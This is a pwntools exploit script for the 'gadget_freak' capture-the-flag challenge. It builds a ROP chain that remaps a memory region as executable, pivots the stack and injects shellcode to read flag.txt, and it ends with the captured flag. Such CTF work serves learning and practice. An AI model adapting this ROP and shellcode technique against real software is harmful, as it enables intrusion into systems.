from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./gadget_freak', '''
    b *(main+1212)
    continue
''')

# p = remote('gadget-freak.harkonnen.b01lersc.tf', 8443, ssl=True)

# region starts from 0x200000 to 0x201000 is readable and writable, but not executable, where input buffer data will be copied to later, making it a good place to put ROP chain
# region starts from 0x300000 to 0x340000 can be made readable, writable and executable if properly configured, where is full of gadgets with four-byte assembly codes from 0x0000 to 0xfffd
# execve syscall and execveat syscall are forbidden to use

# 1. trigger mmap(0x300000, 0x4000, 7, 0x21, 0xffffffff, 0) to make 0x300000-0x340000 region readable, writable and executable
p.sendlineafter(b"Enter your choice: \n", b'2')
GADGET_1 = 0x300000+0xc358*4  # 0x330d60: pop rax; ret;
GADGET_2 = 0x300000+0xc25f*4  # 0x33097c: pop rdi; ret 0;
GADGET_3 = 0x300000+0xc35e*4  # 0x330d78: pop rsi; ret;
GADGET_4 = 0x300000+0xc35a*4  # 0x330d68: pop rdx; ret;
GADGET_5 = 0x300000+0x50f*4  # 0x30143c: syscall;
GADGET_6 = 0x300000+0xc394*4  # 0x330e50: xchg esp, eax; ret;
# payload that will be read in by fgets to stack directly (partially used as function call argument) and then immediately copied to 0x200000 region (partially used as ROP chain)
rop_payload = p64(GADGET_1)+p64(0)  # rax = 0
rop_payload += p64(GADGET_2)+p64(0)  # rdi = 0
rop_payload += p64(GADGET_3)+p64(GADGET_5+2)  # rsi = 0x30143e
rop_payload += p64(GADGET_4)+p64(0x100)  # rdx = 0x100
rop_payload += p64(GADGET_5)  # read(0, 0x30143e, 0x100) to read in "cat flag.txt" shellcode right after syscall gadget later
rop_payload += b'A'*(0x80-len(rop_payload))  # padding to $rbp-0x28 (input buffer starts from $rbp-0xa8)
rop_payload += p64(7)  # write a value in $rbp-0x28 (be used as prot argument for mmap to make 0x300000-0x340000 region readable, writable and executable)
rop_payload += p64(GADGET_6)  # write a value in $rbp-0x20 (be called later to set rsp = rax = 0x200000 to stack pivot to 0x200000)
p.sendlineafter(b"Enter seed (up to 128 characters): \n", rop_payload)

# 2. trigger stack pivot (xchg esp, eax; ret;) to 0x200000 to execute written ROP chain
p.sendlineafter(b"Enter your choice: \n", b'7')
# payload for read(0, 0x30143e, 0x100) in ROP chain to read in "cat flag.txt" shellcode right after syscall gadget
shellcode_payload = asm(shellcraft.cat('flag.txt'))
p.send(shellcode_payload)

p.interactive()

# bctf{P3t3_g4t_cagHu7_4nYwAy}